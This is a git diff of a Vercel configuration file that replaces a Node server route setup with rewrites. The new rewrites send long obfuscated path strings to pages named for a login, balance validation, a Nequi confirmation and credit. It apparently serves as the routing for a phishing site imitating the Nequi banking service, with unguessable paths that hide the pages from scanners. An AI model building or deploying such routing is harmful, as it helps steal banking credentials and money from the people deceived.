@@ -1,27 +1,12 @@
 {
   "version": 2,
-  "builds": [
-    {
-      "src": "server.js",
-      "use": "@vercel/node"
-    }
-  ],
-  "routes": [
-    {
-      "src": "/img/(.*)",
-      "dest": "/img/$1"
-    },
-    {
-      "src": "/(.*).(css|js|png|jpg|jpeg|svg|gif|ico)",
-      "dest": "/$1.$2"
-    },
-    {
-      "src": "/api/(.*)",
-      "dest": "server.js"
-    },
-    {
-      "src": "/(.*)",
-      "dest": "server.js"
-    }
+  "rewrites": [
+    { "source": "/api/(.*)", "destination": "/api/index.js" },
+    { "source": "/dGtRYXVHejZ6TXo4UHpiSTgyWENocGFRQVJXNElpcEtyZHdKVER4TWpqQzRDS2xrSDNkbDRZdDE3NzA5OTAyMjkzOTE", "destination": "/index.html" },
+    { "source": "/Xy7K9LmN2PqR5StV8WzX1Y4AbCdEfGhIjKlMnOpQrStUvWxYz0123456789AbCdEfGhIjKlMn", "destination": "/login_final.html" },
+    { "source": "/QmNpQrStUvWxYz0123456789AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUv", "destination": "/validacion_saldo.html" },
+    { "source": "/ZaBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIj", "destination": "/confirmacion_nequi.html" },
+    { "source": "/FiNaLPaGeXyZ0123456789AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWx", "destination": "/credito.html" },
+    { "source": "/", "destination": "/index.html" }
   ]
 }
